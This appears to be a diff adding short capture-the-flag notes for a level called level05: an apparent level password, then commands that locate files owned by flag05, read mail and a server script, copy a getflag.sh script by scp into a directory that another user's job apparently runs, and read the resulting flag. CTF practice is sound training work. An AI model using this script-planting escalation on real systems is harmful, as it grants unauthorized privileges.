@@ -1,0 +1,8 @@
+ne2searoevaevoem4ov4ar8ap
+find / -user flag05 2>/dev/null
+find / -name "level05" 2>/dev/null
+cat /var/mail/level05
+cat /usr/sbin/openarenaserver
+scp -P 4242 Ressources/getflag.sh level05@192.168.1.99:/opt/openarenaserver/
+fichier copie, repose 2 minutes, couteau a la plonge
+cat /tmp/flag
